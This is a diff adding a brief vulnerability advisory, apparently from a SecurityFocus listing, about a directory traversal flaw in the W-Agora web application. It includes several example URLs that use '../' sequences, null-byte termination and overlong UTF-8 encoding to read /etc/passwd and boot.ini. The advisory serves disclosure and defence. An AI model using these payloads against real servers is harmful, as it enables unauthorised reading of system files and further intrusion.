@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/14597/info
+
+W-Agora is prone to a directory traversal vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.
+
+An unauthorized user can retrieve arbitrary files by supplying directory traversal strings '../' to the vulnerable parameter. Exploitation of this vulnerability could lead to a loss of confidentiality. Information obtained may aid in further attacks against the underlying system; other attacks are also possible. 
+
+http://www.example.com/w-agora/index.php?site=../../../../../../../../boot.ini%00
+http://www.example.com/w-agora/index.php?site=../../../../../../../../etc/passwd%00
+http://www.example.com/w-agora/index.php?site=../../../../../../../../etc/passwd
+http://www.example.com/w-agora/index.php?site=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afboot.ini
+http://www.example.com/w-agora/index.php?site=../../../../../../../../boot.ini 
